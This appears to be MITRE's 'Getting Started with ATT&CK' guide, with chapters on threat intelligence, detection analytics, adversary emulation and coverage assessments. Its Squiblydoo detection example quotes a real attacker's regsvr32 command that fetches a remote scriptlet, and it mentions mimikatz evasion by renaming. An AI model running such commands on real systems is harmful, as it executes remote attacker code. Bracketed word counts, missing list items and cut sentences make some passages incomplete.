It’s been incredible to watch the spread and adoption of the MITRE ATT&CK™ framework  
in the cybersecurity world the last several years. We’ve enjoyed working with a vibrant  
and growing community that has created tons of useful articles, presentations, blog  
posts, and tweets, all helping people understand ATT&CK.
[Word Count: 48]

Despite these great resources, it felt like most of the material out there either introduced  
what ATT&CK is or dove deeply into advanced topics around ATT&CK. But what if you’re  
just taking your first steps with it?
[Word Count: 37]

That’s why during summer 2019 we decided to write a series of blog posts around getting  
started with ATT&CK. The posts, inspired by Katie Nickels’ Sp4rkcon talk “Putting MITRE  
ATT&CK into Action with What You Have, Where You Are,” were written by members of  
the ATT&CK team and focused on what we consider ATT&CK’s four primary use cases.  
For each use case, the authors laid out advice on how an organization could get started  
with ATT&CK based on available resources and overall maturity.
[Word Count: 83]

This publication pulls together their collective wisdom, originally posted on Medium, into  
a single package. We hope you read it and get some new ideas on getting started with  
ATT&CK. Let us know what you think—we’d love to hear your feedback.

Based on feedback from ATT&CK users, both at the first ATT&CKcon and from other avenues,  
we’ve learned a lot. As we’ve talked to you, we’ve realized that it would help for us to take a step  
back and focus on a question many of you have: How do I get started using ATT&CK?
[Word Count: 53]

This book started as a series of blog posts aimed at answering that question for four key use cases:
[Word Count: 19]

Square detection and analytics 
Square adversary emulation and red teaming
[Word Count: 10]

We  reorganized our website to share content based on these use cases, and our hope is these  
blog posts will add to those resources.
[Word Count: 24]

ATT&CK can be useful for any organization that wants to move toward a threat-informed  
defense, so we want to share ideas for how to start regardless of how sophisticated your team is.  
We’ll break each of these posts into different levels:
[Word Count: 41]

Square Level 1 for those just starting out who may not have many resources
[Word Count: 14]

Square Level 2 for mid-level teams starting to mature
[Word Count: 9]

Square Level 3 for more advanced cybersecurity teams and resources
[Word Count: 10]

We’re kicking off this book by talking about threat intelligence because it’s the best use case  
(though I’m sure my colleagues might disagree with that!).
[Word Count: 25]

In 2018, I gave a high-level overview of how you can use ATT&CK to advance cyber threat  
intelligence (CTI). In this chapter, I’ll build on that and share practical advice for getting started.
[Word Count: 33]

Cyber threat intelligence is all about knowing what your adversaries do and using that  
information to improve decision-making. For an organization with just a couple of analysts  
that wants to start using ATT&CK for threat intelligence, one way you can start is by taking  
a single group you care about and looking at their behaviors as structured in ATT&CK.
[Word Count: 59]

You might choose a group from those we’ve mapped on our website based on what  
organizations they’ve previously targeted. Alternatively, many threat intelligence subscription  
providers also map to ATT&CK, so you could use their information as a reference.

Example: If you were a pharmaceutical company, you could search in our Search bar or  
on our Groups page to identify that APT19 is one group that has targeted your sector.
[Word Count: 31]

From there, you can bring up that group’s page to look at the techniques they’ve used  
(based solely on open source reporting we’ve mapped) so you can learn more about  
them. If you need more info on the technique because you’re not familiar with it, no  
problem—it’s right there on the ATT&CK website. You could repeat this for each of the  
software samples that we’ve mapped the group using, which we track separately on the  
ATT&CK website.
[Word Count: 77]

Example:  One technique used by  APT19 is Registry Run Keys/Startup Folder.
[Word Count: 11]

GETTING STARTED WITH ATT&CK: Threat Intelligence | Katie Nickels
[Word Count: 9]

So how do we make this information actionable, which is the whole point of threat  
intelligence? Let’s share it with our defenders, since this is a group who has targeted  
our sector and we want to defend against them. As you do this, you can check out the  
ATT&CK website for some ideas to get you started with Detection and Mitigation of  
techniques.
[Word Count: 63]

Example: Let your defenders know about the specific Registry run key APT19 has used.  
However, they might change that and use a different run key. If you look at the Detection  
advice for the technique, you see a recommendation is to monitor the Registry for new run  
keys that you don’t expect to see in your environment. This would be a great conversation  
to have with your defenders.
[Word Count: 68]

DETECTION IDEAS FOR THE  REGISTRY RUN KEYS / STARTUP FOLDER TECHNIQUE
[Word Count: 11]

In summary, an easy way to start using ATT&CK for threat intelligence is to look at a  
single adversary group you care about. Identifying some behaviors they’ve used helps   
you inform your defenders about how they can try to detect that group.
[Word Count: 42]

If you have a team of threat analysts who regularly review information about adversaries, 
a next-level action you can take is to map intelligence to ATT&CK yourself rather than 
using what others have already mapped. If you have a report about an incident your 
organization has worked, this can be a great internal source to map to ATT&CK, or you 
could use an external report like a blog post. To ease into this, you can just start with a 
single report.
[Word Count: 81]

GETTING STARTED WITH ATT&CK: Threat Intelligence | Katie Nickels
[Word Count: 9]

Example:  Here is a snippet from a FireEye report that’s been mapped to ATT&CK.
[Word Count: 14]

We realize it can be intimidating to try to map to ATT&CK when you don’t know all the  
hundreds of techniques. Here’s a process you could follow to help with this.
[Word Count: 31]

1. Understand ATT&CK—Familiarize yourself with the overall structure of ATT&CK: 
tactics (the adversary’s technical goals), techniques (how those goals are achieved), 
and procedures (specific implementations of techniques). Take a look at our Getting  
Started page and Philosophy Paper.
[Word Count: 38]

2. Find the behavior—Think about the adversary’s action in a broader way than just the 
atomic indicator (like an IP address) they used. For example, the malware in the above 
report “establishes a SOCKS5 connection.” The act of establishing a connection is a 
behavior the adversary took.
[Word Count: 47]

3. Research the behavior—If you’re not familiar with the behavior, you may need to do 
more research. In our example, a little research would show that SOCKS5 is a Layer 5 
(session layer) protocol.
[Word Count: 34]

4. Translate the behavior into a tactic—Consider the adversary’s technical goal for that 
behavior and choose a tactic that fits. The good news: there are only 12 tactics to 
choose from in Enterprise ATT&CK. For the SOCKS5 connection example, establishing 
a connection to later communicate would fall under the Command and Control tactic.
[Word Count: 53]

5. Figure out what technique applies to the behavior—This can be a little tricky, but 
with your analysis skills and the ATT&CK website examples, it’s doable. If you search 
our website for SOCKS, the technique Standard Non-Application Layer Protocol  
(T1095) pops up. Looking at the technique description, you’ll find this could be where 
our behavior fits.
[Word Count: 56]

GETTING STARTED WITH ATT&CK: Threat Intelligence | Katie Nickels
[Word Count: 9]

6. Compare your results to other analysts—Of course, you might have a different
[Word Count: 13]

interpretation of a behavior than another analyst. This is normal, and it happens all the  
time on the ATT&CK team! I’d highly recommend comparing your ATT&CK mapping of  
information to another analyst’s and discussing any differences.
[Word Count: 36]

For those CTI teams who have a couple of analysts, mapping information to ATT&CK  
yourself can be a good way to ensure you’re getting the most relevant information to  
meet your organization’s requirements. From there, you can pass the ATT&CK-mapped  
adversary information to your defenders to inform their defenses, as we discussed above.
[Word Count: 53]

If your CTI team is advanced, you can start to map more information to ATT&CK, and  
then use that information to prioritize how you defend. Taking the above process, you can  
map both internal and external information to ATT&CK, including incident response data,  
reports from OSINT or threat intel subscriptions, real-time alerts, and your organization’s  
historic information.
[Word Count: 57]

Once you’ve mapped this data, you can do some cool things to compare groups and  
prioritize commonly used techniques. For example, take this matrix view from the  
ATT&CK Navigator that I previously shared with techniques we’ve mapped on the  
ATT&CK website. Techniques used only by APT3 are highlighted in blue; the ones used  
only by APT29 are highlighted in yellow, and the ones used by both APT3 and APT29 are  
highlighted in green. (All this is based solely on publicly available information that we’ve  
mapped, which is only a subset of what those groups have done.)
[Word Count: 96]

[Word Count: 9]

You should substitute the groups and techniques you care about based on your  
organization’s top threats. To help you make your own Navigator layers like I’ve done above,  
here is a step-by-step guide on the steps you can take to produce the above matrix, as  
well as a video walkthrough that also provides an overview of Navigator functionality.

If our defenders have already done an assessment of what they can detect (which we’ll  
cover in future chapters), you can overlay that information onto what you know about  
your threats. This is an excellent place to focus your resources since you know groups  
you care about have used those techniques  and you can’t detect them!
[Word Count: 56]

You can continue adding in the techniques you’ve observed adversaries doing based on  
the data you have and develop a “heat map” of frequently used techniques. Brian Beyer  
and I spoke at the SANS CTI Summit about how we came up with different “top 20”  
techniques based on MITRE-curated and Red Canary-curated datasets. Your team could  
follow this same process to create your own “top 20.”
[Word Count: 66]

GETTING STARTED WITH ATT&CK: Threat Intelligence | Katie Nickels
[Word Count: 9]

This process of mapping ATT&CK techniques isn’t perfect and has bias, but this  
information can still help you start to gain a clearer picture of what adversaries are doing.  
(You can read more on biases and limitations in this slide deck, and we hope to share  
additional thoughts soon.)
[Word Count: 49]

For an advanced team seeking to use ATT&CK for CTI, mapping various sources to  
ATT&CK can help you build a deep understanding of adversary behavior to help prioritize  
and inform defense in your organization.
[Word Count: 34]

In our first chapter in the Getting Started guide, we’ve walked you through three different  
levels for how to get started with ATT&CK and threat intelligence, depending on your  
team’s resources. In future chapters, we’ll dive into how you can get started with other  
use cases, including detection and analytics, adversary emulation and red teaming, and  
assessment and engineering.

Hopefully you had a chance to read in Chapter 1 on getting started using ATT&CK for threat  
intelligence, which walked through understanding what adversaries are doing to attack you and  
how to use that knowledge to prioritize what to defend. In this chapter, I’ll talk about how to build  
detections for those behaviors.
[Word Count: 53]

As with the first chapter in this book, this chapter will be broken up by levels based on how  
sophisticated your team is and what resources you have access to:
[Word Count: 30]

Square Level 1 for those just starting out who may not have many resources 
Square Level 2 for those who are mid-level teams starting to mature 
Square Level 3 for those with more advanced cybersecurity teams and resources
[Word Count: 38]

Building analytics to detect ATT&CK techniques might be different from how you’re used to doing 
detection. Rather than identifying things that are known to be bad and blocking them, ATT&CK-
based analytics involve collecting log and event data about the things happening on your systems 
and using that to identify the suspicious behaviors described in ATT&CK.
[Word Count: 56]

The first step to creating and using ATT&CK analytics is understanding what data and 
search capabilities you have. To find suspicious behaviors, after all, you need to be able to 
see what’s happening on your systems. One way to do this is to look at the Data Sources 
listed for each ATT&CK technique. Those data sources describe the types of data that 
could give you visibility into the given technique. In other words, they give you a good 
starting point for what to collect.
[Word Count: 84]

[Word Count: 10]

If you look through the data sources for a bunch of different techniques, or follow the 
approach Roberto Rodriguez and Jose Luis Rodriguez demonstrated at ATT&CKcon to 
look across techniques at data sources (MITRE also created some helper scripts), you’ll 
notice that several sources are valuable at detecting a large number of techniques:
[Word Count: 53]

Square Process and process command line monitoring, often collected by Sysmon, Windows 
Event Logs, and many EDR platforms
[Word Count: 18]

Square File and registry monitoring, also often collected by Sysmon, Windows Event Logs, 
and many EDR platforms
[Word Count: 17]

Square Authentication logs, such as those collected from the domain controller via Windows 
Event Logs
[Word Count: 15]

Square Packet capture, especially east/west capture such as that collected between hosts 
and enclaves in your network by sensors such as Zeek
[Word Count: 22]

Bonus Level 0 Content: Need access to a good enterprise dataset for testing? 
Check out the Boss of the SOC (BOTS) dataset from Splunk or the BRAWL dataset  
from MITRE. Both are available as JSON and so can be loaded into Splunk, ELK, and 
other SIEMs. BOTS is very extensive and contains real noise, while BRAWL is much more 
constrained and focuses only on the red team activity.
[Word Count: 68]

Once you’ve got data in your SIEM you’re ready to try some analytics. One great starting 
point is to look at analytics created by others and run them against your data. There are 
several analytic repositories listed in the resources below, but a good starter analytic if 
you have endpoint process data is CAR-2016–03–002. That will try to find usage of WMI 
to execute commands on remote systems, a common adversary technique described by 
Windows Management Instrumentation.

CAR ENTRY FOR CREATE REMOTE PROCESS VIA WMIC
[Word Count: 8]

You’ll want to read and understand the description to know what it’s looking for, but  
the important part to get it running is the pseudocode at the bottom. Translate that  
pseudocode into a search for whatever SIEM you’re using (making sure the field names  
in your data are correct), and you can run it to get results. If you’re not comfortable  
translating the pseudocode, you can also use an open source tool called Sigma and its  
repository of rules to translate to your target. In this case, CAR-2016–03–002 is included  
in a Sigma rule already.
[Word Count: 95]

GETTING STARTED WITH ATT&CK: Detection and Analytics | John Wunder
[Word Count: 10]

If you’ve installed Sigma and you’re in its directory you can run this command to get (as  
an example) the ELK/WinLogBeats query:
[Word Count: 22]

sigmac --target es-qs -c tools/config/winlogbeat.yml rules/windows/process_ 
creation/win_susp_wmi_execution.yml
[Word Count: 7]

RESULTS FROM RUNNING WMI ANALYTIC AGAINST BRAWL DATA
[Word Count: 8]

Your job now is to look through each result and figure out whether it’s malicious. If  
you used the BRAWL dataset, it’s all pretty malicious: it tries to run and.exe, and upon  
further exploring the related events, and.exe had just been moved to that host over SMB  
and added to the autorun registry keys for persistence. If you’re looking at your own  
enterprise data, it’s hopefully benign or known red team data—if not, maybe stop reading  
this chapter and figure out what you’re dealing with.
[Word Count: 85]

Once you have the basic search returning data and feel comfortable that you can  
understand the results, try to filter out the false positives in your environment so that you  
don’t overwhelm yourself. Your goal shouldn’t be to get to zero false positives; it should  
be to reduce them as much as possible while still ensuring that you’ll catch the malicious  
behavior. Once the analytic has a low false-positive rate, you can automate creating a  
ticket in your SOC each time the analytic fires or adding it to a library of analytics to use  
for manual threat hunting.
[Word Count: 98]

GETTING STARTED WITH ATT&CK: Detection and Analytics | John Wunder
[Word Count: 10]

Once you have analytics other people wrote in operations, you can start expanding  
coverage by writing your own analytics. This is a more complicated process that requires  
understanding how the attacks work and how they get reflected in the data. To start,  
look at the technique description from ATT&CK and the threat intel reports linked in the  
examples.
[Word Count: 58]

As an example, let’s pretend there were no good detections for Regsvr32. The ATT&CK  
page lists several different variants for how Regsvr32 is used. Rather than writing one  
analytic to cover all of them, focus in on just one aspect to avoid spinning your wheels.  
For example, you might want to detect the “Squiblydoo” variant that was discovered  
by Casey Smith at Red Canary. The reports linked from the examples show several  
instances of command lines where Regsvr32 was used, such as this example from the  
Cybereason analysis of Cobalt Kitty:
[Word Count: 91]

The attackers downloaded COM scriplets using regsvr32.exe:  
regsvr32 /s/n/u/i:hxxp://support.chatconnecting(.)com:80/pic.png scrobj.dll

OUTPUT FROM RUNNING THE SQUIBLYDOO ATTACK TO LAUNCH CALC.EXE
[Word Count: 9]

Once you’ve run the attack, look inside your SIEM to see what log data was generated.  
At this stage, you’re looking for things that make this malicious event look distinctive. I  
picked Squiblydoo as an example because it’s an easy one: there’s no legitimate reason  
to have regsvr32.exe call out to the Internet, so a simple analytic is to look for times when  
the regsvr32.exe process is created and the command line includes “/i:http”.
[Word Count: 74]

A general pattern to follow is to write the search to detect malicious behavior, revise it to  
filter out false positives, make sure it still detects the malicious behavior, and then repeat  
to reduce other sorts of false positives.

Feel confident that you’re cranking out quality analytics to detect attacks from Atomic  
Red Team? Test that confidence and improve your defenses by doing some purple  
teaming!
[Word Count: 27]

Here’s how that might work in practice. You have some analytic, let’s say to detect  
credential dumping. Maybe you heard about mimikatz and write an analytic to detect  
mimikatz.exe on the command line or Invoke-Mimikatz via Powershell. To purple team  
this,  give that analytic to your red team. They can then find and execute an attack that  
will evade that analytic.
[Word Count: 61]

In this case, they might rename the executable to mimidogz.exe. At that point, you’ll need 
to update your analytic to look for different artifacts and behaviors that won’t rely on 
the exact naming. Perhaps you look for the specific GrantedAccess bitmask from when 
mimikatz accesses lsass.exe (don’t worry about the exact details, this is just an example). 
You’ll again give this to your red team, and they’ll execute an evasion that, for example, 
adds an additional access so that your GrantedAccess bitmask no longer detects it.
[Word Count: 86]

This back and forth is known as purple teaming. It’s a great way to rapidly improve the  
quality of your analytics because it measures your ability to detect the attacks that  
adversaries actually use. Once you get to a stage where you’re purple teaming all of  
your analytics, you can even automate the process to make sure you don’t have any  
regressions and are catching new variants of attacks. We’re working on developing  
material just like this, talking more about adversary emulation and red-teaming   
—so stay tuned to learn much more about that half of the process.
[Word Count: 97]

This is also related to what Andy Applebaum will talk about in Chapter 4 on ATT&CK SOC 
Assessments. Once you’re this advanced and are building out a corpus of analytics, you’ll 
want to use ATT&CK (either via the ATT&CK Navigator or using your own tools) to track 
what you can and can’t cover. Maybe, for example, you start with a wish-list of analytics 
to detect the techniques that Katie Nickels and Brian Beyer point out in their SANS CTI  
Summit presentation.

Then, you integrate the analytics from CAR and color those orange to indicate that at  
least you have some coverage (as indicated above, a single analytic is unlikely to provide  
sufficient coverage for any given technique).
[Word Count: 36]

GETTING STARTED WITH ATT&CK: Detection and Analytics | John Wunder
[Word Count: 10]

Then, you refine those analytics and maybe add more to improve your coverage for those  
techniques. Eventually, maybe you’re comfortable enough with your detection for some  
of them that you color them green. Just keep in mind that you’ll never be 100% sure of  
catching every usage of a given technique, so green doesn’t mean done, it just means OK  
for now.

This chapter gave you an idea of what it means to build analytics to detect ATT&CK  
techniques, as well as how to think about building out a suite of analytics. It builds on  
the previous chapter to show not just that you can understand what the adversary can  
do via cyber threat intelligence, but that you can use that intelligence to build analytics  
to detect those techniques. Future chapters will talk more about how to build an

do comprehensive red teaming to validate your defenses.

We hope you have taken the time to read both Chapter 1 on getting started using ATT&CK for 
threat intelligence and Chapter 2 on using ATT&CK for detection and analytics! We’re here to 
bring you the third chapter, this time covering adversary emulation and red teaming with ATT&CK 
to demonstrate how we can test those new analytics John showed us how to build.
[Word Count: 63]

Continuing the theme of the previous chapters, this section will be broken up by levels based on  
your team’s level of sophistication and what resources you have access to:
[Word Count: 29]

Square Level 1 for those just starting out who may not have many resources 
Square Level 2 for those who are mid-level teams starting to mature 
Square Level 3 for those with more advanced cybersecurity teams and resources
[Word Count: 38]

For those unfamiliar with it, adversary emulation is a type of red team engagement that mimics  
a known threat to an organization by blending in threat intelligence to define what actions  
and behaviors the red team uses. This is what makes adversary emulation different from  
penetration testing and other forms of red teaming.
[Word Count: 53]

Adversary emulators construct a scenario to test certain aspects of an adversary’s tactics, 
techniques, and procedures (TTPs). The red team then follows the scenario while operating on a 
target network to test how defenses might fare against the emulated adversary.
[Word Count: 40]

Since ATT&CK is a large knowledge base of real-world adversary behaviors, it doesn’t take much  
imagination to draw a connection between adversary or red team behaviors and ATT&CK. Let’s  
explore how security teams can use ATT&CK for adversary emulation to help improve their  
organizations.
[Word Count: 44]

Small teams and those mainly focused on defense can get a lot of benefit out of 
adversary emulation even if they don’t have access to a red team, so don’t worry! 
There are quite a few resources available to help jump-start testing your defenses 
with techniques that align with ATT&CK. We’ll highlight how you can dip your toe into 
adversary emulation by trying simple tests.
[Word Count: 65]

Atomic Red Team, an open source project maintained by Red Canary, is a collection 
of scripts that can be used to test how you might detect certain techniques and 
procedures mapped to ATT&CK techniques. For example, maybe you’ve followed the 
advice in Chapter 1 and looked at techniques used by APT3 such as Network Share  
Discovery (T1135). Your intel team passed this to your detection team and, following the 
guidance in Chapter 2, they wrote a behavioral analytic to try to detect if an adversary 
performed this technique. But how do you know if you’d really detect that technique?
[Word Count: 99]

GETTING STARTED WITH ATT&CK: Adversary Emulation and Red Teaming | Blake Strom, Tim Schulz, and Katie Nickels
[Word Count: 17]

Atomic Red Team can be used to test individual techniques and procedures to verify that 
behavioral analytics and monitoring capabilities are working as expected.
[Word Count: 24]

The Atomic Red Team repository has many atomic tests, each with a directory dedicated  
to the ATT&CK technique that is tested. You can view the full repository in the ATT&CK  
Matrix format.
[Word Count: 32]

To start testing, select the T1135 page to see the details and different types of atomic 
tests that are documented. Each of these tests contains information about what the 
technique is, the platforms supported, and how to execute the test.
[Word Count: 40]

We see there are three test options and decide to choose #2 to test with the command 
prompt. So, we open up our command prompt, copy and paste the command, add in the 
computer name, and execute the command.
[Word Count: 39]

We just executed our first atomic test! Once this is done, we can take a look to see if  
what we expected to detect was what we actually detected. For example, maybe we had  
a behavioral analytic in our SIEM tool that should have alerted when “net view” executed,  
but we find it didn’t fire, so we figure out logs weren’t correctly being exported from  
our host. You troubleshoot and fix the problem, and now you’ve made a measurable

[Word Count: 17]

These singular tests allow for a laser focus on individual ATT&CK techniques, which 
makes building ATT&CK-based defensive coverage easier to approach because you can 
start with a single test for a single technique and expand from there.
[Word Count: 37]

GETTING STARTED WITH ATT&CK: Adversary Emulation and Red Teaming | Blake Strom, Tim Schulz, and Katie Nickels
[Word Count: 17]

For those of you out there who already have red team capabilities, you can get a lot out 
of integrating ATT&CK with your existing engagements. Mapping the techniques used in 
a red team engagement to ATT&CK provides a common framework when writing reports 
and discussing mitigations.
[Word Count: 46]

To get started, you could take an existing planned operation or tool you use and map  
it to ATT&CK. Mapping red team procedures to ATT&CK is similar to mapping threat  
intelligence to ATT&CK, so you might want to check out Katie’s recommendations for a  
six-step process outlined in Chapter 1.
[Word Count: 50]

Luckily, sometimes mapping techniques can be as simple as searching the command 
used on the ATT&CK website. For example, if we’ve used the “whoami” command in 
our red team operation, we can search that on the ATT&CK website and find that two 
techniques likely apply: System Owner/User Discovery (T1033) and Command-Line  
Interface (T1059).
[Word Count: 53]

Another helpful resource to get you started mapping red team procedures to ATT&CK is  
the APT3 Adversary Emulation Field Manual, which breaks out command-by-command  
actions that APT3 has used, all mapped to ATT&CK.

[Word Count: 17]

EXCERPT FROM OUR “APT3 ADVERSARY EMULATION FIELD MANUAL”
[Word Count: 8]

If your red team is using tools like Cobalt Strike or Empire, good news—these are already  
mapped to ATT&CK. Armed with your individual commands, scripts, and tools mapped to  
ATT&CK, you can now plan your engagement.
[Word Count: 36]

Some red teams have their tried and true toolkits and methods of operation. They  
know what works because it works all the time. But what they don’t always know is how  
much of their tried and true TTPs overlap (or don’t!) with known threats that may target  
the organization. That leads to a bit of a gap in understanding how well the defenses  
stack up to what you’re actually trying to defend against—the adversaries targeting your  
environment and not necessarily the red team themselves.
[Word Count: 84]

We want to make sure we’re not just doing the techniques because our tool can perform  
them—we want to emulate a real adversary we care about to provide more value. For  
example, we could talk to our CTI team and they tell us they’re concerned about targeting  
from the Iranian group known as OilRig.
[Word Count: 54]

Since everything is structured in ATT&CK, we can use the ATT&CK Navigator to  
compare the techniques we could do with a tool we already have, like Cobalt Strike, to  
the techniques that we know OilRig has done based on open source reporting.  (You  can  
check out a demo of the Navigator that shows how to do this.)  In  the  next  graphic,  Cobalt  
Strike techniques are red, OilRig techniques are blue, and techniques Cobalt Strike can  
perform and OilRig has used are purple.
[Word Count: 82]

These purple techniques give us a place to start to use a tool we already have and  
perform techniques that are a priority to our organization.
[Word Count: 26]

[Word Count: 17]

ATT&CK MATRIX SHOWING COBALT STRIKE AND OILRIG TECHNIQUE OVERLAP
[Word Count: 9]

Aside from identifying overlap between Cobalt Strike and OilRig, the analysis can also  
show where there are opportunities to vary the red team’s behaviors beyond what they  
typically employ down to the procedure level.
[Word Count: 34]

There may be cases where a technique is implemented in a particular way in the tools  
the red team uses, but an adversary isn’t known to perform it in that way. Having that  
knowledge helps the red team use different behaviors between tests to better cover  
what threats are known to do as part of the adversary emulation process.
[Word Count: 59]

At this point we could also add in techniques we want to manually perform with commands  
or scripts. We could then add comments into the Navigator about the order we’ll execute  
the techniques in and how we will perform them.
[Word Count: 40]

While there are benefits to mapping to ATT&CK as we plan red team operations, we also  
reap the rewards once we’ve executed our operation as we communicate back to our blue  
team. If they are mapping analytics, detections, and controls back to ATT&CK, you can  
easily communicate with them in a common language about what you did and what they  
were successful at. Including an ATT&CK Navigator image (and even a saved Navigator  
layer) in a report can help this process and give them a template to improve upon.
[Word Count: 89]

GETTING STARTED WITH ATT&CK: Adversary Emulation and Red Teaming | Blake Strom, Tim Schulz, and Katie Nickels
[Word Count: 17]

Bonus Level 2.5 Content: After using ATT&CK to plan engagements and report results,  
try using the  APT3 Emulation Plan or the ATT&CK Evaluations Round 1 scenario based on  
that plan to conduct an engagement emulating APT3 to show a baseline test against a  
particular adversary group.
[Word Count: 46]

By this point, your red team is integrating ATT&CK into operations and finding value in 
communicating back to the blue team. To advance your teams and the impact they’re 
having even more, you can collaborate with your organization’s CTI team to tailor 
engagements toward a specific adversary using data they collect by creating your own 
adversary emulation plan.
[Word Count: 58]

Creating your own adversary emulation plan draws on the greatest strength of combining  
red teaming with your own threat intelligence: the behaviors are seen from real-world  
adversaries targeting you! The red team can turn that intel into effective tests for  
showing what defenses work well and where resources are needed to improve.
[Word Count: 52]

There is a much higher level of impact when visibility and control gaps are exposed by  
security testing when you can show a high likelihood that they have been leveraged by a  
known adversary. Linking your own CTI to adversary emulation efforts will increase both  
the effectiveness of testing and the outputs to senior leadership to enact change.
[Word Count: 58]

We recommend a five-step process depicted in the diagram below to create an  
adversary emulation plan, execute the operation, and drive defensive improvements. (For  
a more detailed outline of the process, see the presentation by Katie Nickels and Cody  
Thomas on Threat-Based Adversary Emulation with ATT&CK.)

PROCESS FOR CREATING AN ADVERSARY EMULATION PLAN
[Word Count: 7]

GETTING STARTED WITH ATT&CK: Adversary Emulation and Red Teaming | Blake Strom, Tim Schulz, and Katie Nickels
[Word Count: 17]

1. Gather threat intel—Select an adversary based on the threats to your organization 
and work with the CTI team to analyze intelligence about what the adversary has 
done. Combine what’s based on what your organization knows in addition to publicly 
available intel to document the adversary behaviors, what they go after, whether they 
do smash and grab or low and slow.
[Word Count: 61]

2. Extract techniques—In the same way you mapped your red team operations to 
ATT&CK techniques, map the intel you have to specific techniques in conjunction with 
your intel team. You could point your CTI team to Chapter 1 to help them learn how to 
do this.
[Word Count: 46]

3. Analyze & organize—Now that you have a bunch of intel about the adversary and how 
they operate, diagram that information into their operational flow in a way that’s easy 
to create specific plans from. For example, below is the operational flow the MITRE 
team created for the APT3 Adversary Emulation Plan.
[Word Count: 52]

4. Develop tools and procedures—Now that you know what you’d like the red team to 
do, figure out how to implement the behavior. Consider:
[Word Count: 24]

Square How did the threat group use this technique? 
Square Did the group vary which technique was used based on the environment context? 
Square What tools can we use to replicate these TTPs? 
5. Emulate the adversary—With a plan in place, the red team now has the ability to 
execute and perform an emulation engagement. As we’ve recommended for all red 
team engagements using ATT&CK, the red team should closely work with the blue 
team to gain a deep understanding of where gaps are in the blue team’s visibility and 
why they exist.
[Word Count: 93]

GETTING STARTED WITH ATT&CK: Adversary Emulation and Red Teaming | Blake Strom, Tim Schulz, and Katie Nickels
[Word Count: 17]

Once this entire process takes place, the red and blue teams can work with the CTI team 
to determine the next threat to repeat the process on, creating a continuous activity that 
tests defenses against real-world behaviors.
[Word Count: 37]

This chapter has showed you how to use ATT&CK for red teaming and adversary 
emulation, regardless of what resources you have (including if you don’t have a red team 
yet). We hope you’ve observed throughout this book that each of these topics builds on 
the other, with threat intelligence informing the creation of analytics that can be validated 
and improved through adversary emulation—all while using the common language 
of ATT&CK. The next (and final) chapter will talk about performing assessments and 
engineering with ATT&CK, rounding out our Getting Started with ATT&CK series.

Over the previous chapters, we’ve covered getting started with ATT&CK by using it for threat  
intelligence, for detection and analytics, and for adversary emulation. In this fourth section, we’re  
going to talk about assessments and engineering, showing how you can use ATT&CK to measure  
your defenses and enable improvement. In many ways this chapter builds on the prior ones, so  
we recommend reading them first if you haven’t already.
[Word Count: 69]

To make this process more accessible—and following along with the other chapters—we’ve 
broken this section down into three levels based on sophistication and resource availability:
[Word Count: 25]

Square Level 1 for those just starting out who may not have many resources 
Square Level 2 for those who are mid-level teams starting to mature 
Square Level 3 for those with more advanced cybersecurity teams and resources
[Word Count: 38]

Getting started with “assessments” might sound frightening at first—who enjoys being 
assessed?—but ATT&CK assessments are a part of a larger process to provide useful data to 
security engineers and architects justifying threat-based security improvements:
[Word Count: 34]

1.  Assess how your defenses currently stack up to techniques and adversaries in ATT&CK
[Word Count: 14]

2.  Identify the highest-priority gaps in your current coverage
[Word Count: 9]

3.  Modify your defenses—or acquire new ones—to address those gaps
[Word Count: 10]

The levels for assessments and engineering are cumulative and build on each other. Even if you  
consider yourself an advanced cybersecurity team, we still encourage you to start at Level 1 and  
walk through the process to ease into a larger assessment.
[Word Count: 42]

GETTING STARTED WITH ATT&CK: Assessments and Engineering | Andy Applebaum
[Word Count: 10]

If you’re working with a small team that doesn’t have access to lots of resources and 
you’re thinking of doing a full assessment, don’t. The idea of right away creating a color-
coded heatmap of the ATT&CK matrix that visualizes your coverage is appealing but is 
more likely to leave you burnt out on ATT&CK than excited to use it.
[Word Count: 60]

Instead, start small: select a single technique to focus on, determine your coverage 
for that technique, and then make the appropriate engineering enhancements to start 
detecting it. By starting this way, you can practice how you’d run a larger assessment.
[Word Count: 40]

Tip: Not sure which technique to start with? Check out Chapter 1 for how you might use 
ATT&CK and threat intelligence to choose a starting point.
[Word Count: 26]

Once you have a technique picked out, you’ll want to figure out what your coverage 
of that technique is. While you can use your own rubric, we suggest starting with the 
following categories of coverage:
[Word Count: 35]

Square Your existing analytics will likely detect the technique;
[Word Count: 9]

Square Your analytics won’t detect the technique, but you’re pulling in the right data sources to 
detect it; or
[Word Count: 19]

Square You’re not currently pulling in the right data sources to detect the technique.
[Word Count: 14]

Tip: When first starting out, keep your scoring categories simple: Are you able to detect it 
or not?
[Word Count: 18]

A great way to get started on measuring coverage is to look at your analytics to see what 
techniques they might already cover. This can be time consuming, but well worth the 
effort: many SOCs already have rules and analytics that might map back to ATT&CK, 
even if they weren’t originally designed to do so. Oftentimes you’ll need to bring in other 
information about the technique, which you can get from the technique’s ATT&CK page 
or an external source.
[Word Count: 79]

As an example, suppose we’re looking at Remote Desktop Protocol (T1076) and we have 
the following alerts:
[Word Count: 17]

2. All processes spawned by AcroRd32.exe
[Word Count: 6]

4. All internal network traffic over port 3389
[Word Count: 8]

Looking at the ATT&CK technique page for Remote Desktop Protocol, we can quickly see 
that rule #3 matches what’s specified under the “detection” header. A quick web search 
shows that port 3389—specified by rule #4—also corresponds to the technique.
[Word Count: 39]

[Word Count: 10]

DETECTION TEXT FOR REMOTE DESKTOP PROTOCOL
[Word Count: 6]

If your analytics are already picking up the technique, great! Record your coverage for 
that technique and then pick a new one to start the process again. If you’re not covering 
it, look at the data sources listed on the technique’s ATT&CK page and determine if you 
might be already pulling in the right data to build a new analytic. If you are, then it’s just a 
question of building one out.
[Word Count: 72]

But if you’re not pulling in the right data sources, what should you do? This is where 
engineering comes into play. Take a look at the data sources listed on the technique’s 
ATT&CK page as a possible starting point and try to gauge the difficulty for you to start 
collecting each of them versus the effectiveness of how you’d be able to use them.
[Word Count: 64]

Tip: A frequently cited data source is Windows Event Logs, which provide visibility into 
many ATT&CK techniques. A good resource for getting started with event logs is Malware 
Archaeology’s Windows ATT&CK Logging Cheat Sheet, which maps Windows events to the 
techniques you could detect with them.

[Word Count: 23]

Graduating to the next level: Don’t stop at one technique—run through this process  
several times, picking a new technique (or two) across each tactic for each run. Keep  
track of your results using the ATT&CK Navigator, which is great for generating heatmaps  
of ATT&CK coverage.
[Word Count: 45]

Once you feel comfortable with the process, perform a data source analysis and come  
up with a heatmap of which techniques you could detect given the data sources you’re  
pulling in. Some resources that can help you get started here include Olaf Hartong’s  
ATT&CK Datamap project, DeTT&CT, and MITRE’s own ATT&CK scripts.
